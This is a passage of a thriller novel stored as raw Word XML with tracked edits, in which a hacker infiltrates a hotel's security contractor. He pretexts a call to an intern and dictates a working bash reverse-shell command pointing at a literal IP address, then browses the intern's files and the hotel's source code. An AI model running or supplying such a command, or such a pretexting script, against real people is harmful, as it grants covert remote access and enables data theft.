          <w:delText>’m the one that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> booked the reservation.”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squinted in confusion for a few moments. “Oh! I know you now. You are office girl from Tungsten! We talked on telephone! Your name is Tina,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 “Yeah.”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added, “You busted Eugene’s lip with old computer keyboard.”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turned her head away, looked innocently upward, and said, “Maybe.”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browsed the hotel’s website. The screen showed a high-resolution slide show of large cedarwood rooms with floor-to-ceiling windows, a steak-and-seafood restaurant, and panoramas of mountains and evergreen forests.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“Christ, this place is </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sick</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” said Danny. “It’s got its own boat dock in Lake Washington — they let guests take their yachts out for a spin. …Authentic Finnish saunas in the gym …And a helicopter pad on the roof, so guests can fly directly from Sea-Tac Airport on rental choppers.”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grabbed Danny by the arm. “He is in this place right now? Let’s go! We come to my home first, get weapons, get Eugene and Leo, then we get Rosie!”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struggled against his pull. “Jesus, no! Sergey, that’s suicide! Look, the kind of people that stay at a hotel like this, they’re very high rollers. We’re talking ambassadors, heads of state, officers of multinational corporations… My point is, the security in a place like this is going to be state-of-the-art.”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does not scare me,” Sergey shrugged.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 </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2575" w:author="TextVet" w:date="2016-03-23T16:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>should</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">,” </w:t>
      </w:r>
      <w:ins w:id="2576" w:author="TextVet" w:date="2016-03-23T16:42:00Z">
        <w:r w:rsidR="00986267">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>urge</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2577" w:author="TextVet" w:date="2016-03-23T16:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00986267">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>replie</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d Danny. “Let me put it in perspective for you. This hotel is in Medina — one of the richest districts in the country, and all the money is from technology. Bill Gates’s house is there. Jeff Bezos — the guy who created Amazon — </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> house is there. They have marine radar systems watching the shoreline to call out the Coast Guard if so much as a floating beach ball gets within 500 feet of anyone’s deck. They have cameras on every street corner that use image recognition software to scan every car that drives through the neighborhood. And this is just what it’s like on </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> property. Inside that hotel, there’s going to be world-class physical security </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>systems, full-time guards, hotlines to SWAT teams, you name it. If you go in with guns blazing, you’ll be mowed down before you make it through the lobby.”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what do you suggest?” asked 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don’t know,” said Danny. “Let me think…”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stared at the screen, clicking at random on the web page, looking for leads.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spoke up behind them. “Can I ask why is this so complicated? Why don’t you just call the police?”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looked at her with frustration. “Do you think police would help </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>me</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? Local police want to catch me for very long time. Even if miracle happened and they rescued her from Ivan, you know what they do then? Use her as bargaining chip against me. They make up some reason to put her in foster care, make sure I never see her again, pressure me to turn myself in. Do you know what kind of life is for girl her age in foster system? No, this is not what will happen to my Rosie!”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face was buried in the screen. “Guys, I think I have an idea.”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is your plan?” asked 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the hotel’s security system must’ve been built by somebody…”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paused. “And…?”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the process by which people build things is… Hold on, give me a minute…” Armed again with a Google search page, Danny typed:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>"press release" contract security "Medina Gallante"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scanned the results, dismissing most of them, investigating others. He altered the search query several times. He tried the Wayback Machine, LexisNexis, and a dozen different business blogs.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eventually found what he was looking for. Buried in a tech entrepreneur newsletter from several years prior, there appeared a blurb:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="240" w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SAN JOSE, CA — Carlos Gaeta, President of RockBox Digital Security Systems Co., is proud to announce the signing of a $17.2M contract with the luxury hotel Medina Gallante of Seattle, WA. RockBox will be providing a comprehensive package of digital security solutions, including full integration with the hotel’s reservation, billing, and access management systems.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“RockBox Digital Security Systems, in San Jose, California,” Danny noted aloud.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Several more minutes of study armed him with information about RockBox. From industry reports, press releases, and LinkedIn, he deduced that the company was about ten years old and had about 50 workers, about a dozen of whom were engineers. The company’s website listed its phone number.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reached for his cellphone, plugged into a charger on his desk.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mighty backhand upside his head nearly knocked him out of his chair.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“Ow! What the fuck!” he howled.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glared at him. “What do you think you are doing? You think I let you make telephone call?”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doing what you came to me for!” Danny insisted. He pointed to one of the dozens of browser windows on his screen. “See that post? That’s from a job board at UCLA. It’s advertising a summer internship position at the company that built the Gallante’s security system. This gives me an idea. Now, should I sit here talking about it, or can I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you instead?”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“Fine. But you must keep it on speakerphone.”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and began dialing.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watched Danny work the phone, and narrowed his eyes. “What is strange code you are putting before the phone number?”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star-six-seven. It blocks caller ID. Now, quiet, it’s ringing.”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 older woman’s voice greeted the line. “RockBox Digital Security. How may I direct your call?”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took a deep breath and closed his eyes. In a tone of friendly familiarity, he said, “Hi there. I understand you have a summer intern in your engineering department?”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“Whom may I say is calling?” said the woman.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was thankful she couldn’t see his eyes darting nervously. “This is Danny, with Clay… uh… Prismatic Creations. We’re subcontractors. Your intern was helping us, um, look something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woman issued a perfunctory, “Please hold.” A few moments later, a young man answered, “Hello?”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imitated the gruff, irritated tone of an overtasked worker. “Have you run this week’s spline reticulation process yet?”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Uh… I’m sorry, I’m not sure what that… um…” the young man fumbled. His voice was squeaky with adolescence.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“You’re the intern, right?” said Danny. “Part of the intern’s job is to keep the server’s splines reticulated. How long have you been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“Only two weeks, sir!” the youth said, audibly terrified. “I don’t… Um… How am I supposed to… uh… What do I…?”</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alright. Obviously nobody’s shown you how to do it yet,” said Danny. “Don’t feel bad. I’ll walk you through it, alright?”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“Okay, sir…”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kind of computer is your workstation?” Danny asked. “Windows? Mac? Linux?”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“Mac. Is that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smiled. “It’s perfect…” He laid his hands upon his keyboard and began working. “Give me just a minute to prepare the server…” A few large black windows opened on his computer screens. His typing sent rows of text cascading down his display. After about a minute, he said into the phone, “Now, I need you to open a terminal window. You know what a terminal window is, right? It’s under Applications, Utilities. Then type the following command exactly as I say it…”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>exec /bin/sh 0&lt; /dev/tcp/69.17.116.124/1337 1&gt;&amp;0 2&gt;&amp;0</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other end of the line, the intern dutifully repeated the code.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Messages began appearing in the windows on Danny’s display. He silently pumped his fist in a muted cheer of victory.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young man squawked, “Did it work? It doesn’t look like it’s doing anything…”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“Oh, it’s doing stuff, alright!” Danny assured. “Don’t close that window, okay? I’ll terminate it when… I mean, it’ll terminate on its own when it’s done. Just leave it open. Thank you, young man! Have an </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>excellent</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> career!” He ended the call.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stared at him in confusion. “What the hell was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interlacing his words with his keystrokes, replied, “That was me teaching some poor kid a valuable life lesson about trusting strangers on the phone. The command I had him type opened a reverse shell — it gave me a back door into his workstation. I’m taking all his console output, bouncing it through a webserver at Claymore Communications, and piping it over to my terminal here. From his point of view, all he sees is a frozen window. But </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, on </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>my</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> screen, I’m controlling his machine from remote. Check it out. Here’s all the files in his home directory. Here’s all his running processes. Oh hey, look! Here’s an SVN repository! And </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</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interrupted the geekspeak. “How is any of this helping get back my Rosie?”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moved his mouse cursor over a block of text. It read, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Medina Gallante</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”. “See this folder? It contains all of RockBox’s digital assets for the Gallante account. It’s got PDFs of the Gallante’s floor plans. User manuals. All of the source code for the software that runs the hotel — keycards, cameras, reservations, utilities…”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asked, “And with this you can get me into hotel?”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“With this, we can perform whitebox analysis of their integrated security framework,” Danny explained. “We can study how the engineers of this system went about building it, and read notes </w:t>
      </w:r>
      <w:del w:id="2578" w:author="TextVet" w:date="2016-03-23T16:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D273A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>they left for themselves in the comments of their code. By examining their unit tests, we’ll see which parts of the system they paid extra attention to — and which parts they didn’t. We can study the message-passing framework between different subsystems, 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wrung his hands in frustration. “What is any of this </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mean</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 means we might be able to find a flaw and exploit it. And, if the flaw is bad enough, maybe even take over the entire system. No code project is ever completely free of defects, especially not one with </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2579" w:author="TextVet" w:date="2016-03-23T16:55:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> many different components and built by this many different people. There has to be a chink somewhere in this armor. We just have to find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“You need how much time to do this?” Sergey demanded. “A day? Two?”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laughed humorlessly. “Sergey, something like this could take months.”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are full of shit,” Sergey grumbled.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loaded one of the source code files into an editor and expanded it full-screen. Countless multicolored blocks of text overwhelmed the display. “Can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read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is what you are for,” Sergey retorted.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shook his head. “Looking for defects in source code is a very specialized art. I can’t do this alone. I need to bring more people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looked at him coldly. “There is no other choice, is there?” He slowly bowed his large head, remaining silent for several long seconds. “I have no way to make you cooperate,” he finally growled, almost choking on the words. “I know if I let you reach help, you will think your way around any threat I can make. Maybe you will call police. Maybe you will run away. You are smart. That is entire reason why I need you. And that is also reason why I cannot control you.” He looked up at Danny. His eyes were reddened and moist. “This is my daughter. Zheleznov has stolen her. Do you know what he plans to do to her? Daniel… Please… </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>You must not let him take her back to Saint Petersburg!</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gulped, and looked him in the eye. “If… </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>If</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> I agree to help you… I would </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> do it for the sake of your daughter.”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a tone so low that it was almost inaudible, Sergey said, “As long as you do it.” He swept his thick arm in the direction of Danny’s phone. “You need help for this hacking? Go get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“I know just the men for the job.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>25</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Pyotr</w:t>
      </w:r>
      <w:ins w:id="2580" w:author="TextVet" w:date="2016-03-24T09:28:00Z">
        <w:r w:rsidR="008330CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:smallCaps/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Passinsky watched calmly</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> as one of the Russian bodyguards blasted another’s skull open with a Dragunov rifle.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“Boom! Headshot!” the sniper cheered.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“Son</w:t>
      </w:r>
      <w:ins w:id="2581" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidR="008330CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2582" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008330CA">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of</w:t>
      </w:r>
      <w:ins w:id="2583" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidR="008330CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2584" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008330CA">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w:t>
      </w:r>
      <w:ins w:id="2585" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidR="008330CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2586" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008330CA">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bitch!” yelled the victim,</w:t>
      </w:r>
      <w:del w:id="2587" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008330CA">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slamm</w:t>
      </w:r>
      <w:ins w:id="2588" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidR="008330CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2589" w:author="TextVet" w:date="2016-03-24T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008330CA">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his PlayStation controller on the glass coffee table.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“Easy, brother!” the assassin said, laughing. “It’s not the table’s fault you suck ass.”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“Shut it, dick-muncher,” he replied. “I’ve seen you with a real Dragunov. You can’t shoot your way out of a wet paper bag.”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Another mercenary broke away from a heavy petting session with a waifish whore in one corner of the wide leather couch. He slid over and grabbed the controller. “My turn!”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for his part, merely gazed at the graphics, marveling over the game system’s capabilites.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They sat in a red-carpeted sunken living room inside the Presidential Suite of the Medina Gallante, a luxurious penthouse built of cedar, marble, and glass. The young men had co-opted the enormous TV hanging on one wall to </w:t>
      </w:r>
      <w:del w:id="2590" w:author="TextVet" w:date="2016-03-24T09:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009822EA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">rowdily </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">challenge each other </w:t>
      </w:r>
      <w:ins w:id="2591" w:author="TextVet" w:date="2016-03-24T09:30:00Z">
        <w:r w:rsidR="009822EA" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">rowdily </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Call of Duty</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Throughout the suite, a dozen or so brash men in their twenties and thirties chatted and drank beer and fiddled with loaded handguns.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coffee table</w:t>
      </w:r>
